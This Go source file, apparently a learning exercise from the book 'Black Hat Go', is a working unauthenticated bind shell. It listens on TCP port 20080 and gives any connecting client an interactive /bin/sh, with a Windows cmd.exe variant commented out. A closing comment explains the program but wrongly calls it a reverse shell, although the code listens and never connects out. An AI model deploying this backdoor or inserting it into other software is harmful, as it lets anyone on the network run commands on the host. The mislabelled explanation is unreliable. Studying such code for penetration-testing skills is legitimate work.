package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {

	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	// cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}

// blackhat go, at 17%

/*
* this program sets up a TCP server that listens on port 20080. When a client connects, it launches a shell ('/bin/sh') and connects the client's input and output to this shell. This allows the client to interact with the server's shell as if they were typing directly into it.
* In essence, this code creates a basic reverse shell server, which is commonly used in penetration testing to gain cemote access to a system. However, it's important to note that reverse shells can be a serious security risk if not properly controlled and secured.
 */
